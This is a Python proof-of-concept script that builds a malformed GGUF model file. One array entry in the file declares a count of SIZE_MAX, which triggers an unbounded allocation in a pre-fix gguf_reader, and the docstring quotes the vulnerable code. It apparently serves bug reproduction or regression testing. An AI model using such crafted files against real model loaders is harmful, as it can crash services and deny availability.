#!/usr/bin/env python3
"""Craft a GGUF whose KV array value declares count = SIZE_MAX.

Pre-fix `gguf_reader::read(std::vector<T>&, size_t n)`:
    dst.resize(n);                      // no upper bound!
    for (size_t i = 0; i < dst.size(); ++i) {
        ok = ok && fread(&dst[i], sizeof(T), 1, file);
    }

ASAN flags the dst.resize() as allocation-size-too-big.

GGUF binary layout:
    "GGUF" + version + n_tensors=0 + n_kv=1
    KV: key="x"
        value_type = GGUF_TYPE_ARRAY (9)
        elem_type  = GGUF_TYPE_UINT32 (4)
        count      = SIZE_MAX (uint64)
        (no body bytes)
"""

import struct
import sys

GGUF_TYPE_UINT32 = 4
GGUF_TYPE_ARRAY  = 9
SIZE_MAX = (1 << 64) - 1


def craft(filename: str) -> None:
    with open(filename, "wb") as f:
        f.write(b"GGUF")
        f.write(struct.pack("<I", 3))
        f.write(struct.pack("<Q", 0))
        f.write(struct.pack("<Q", 1))
        # KV
        key = b"x"
        f.write(struct.pack("<Q", len(key))); f.write(key)
        f.write(struct.pack("<I", GGUF_TYPE_ARRAY))
        f.write(struct.pack("<I", GGUF_TYPE_UINT32))
        f.write(struct.pack("<Q", SIZE_MAX))


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "array_exhaustion.gguf"
    craft(out)
    print(f"wrote {out}")
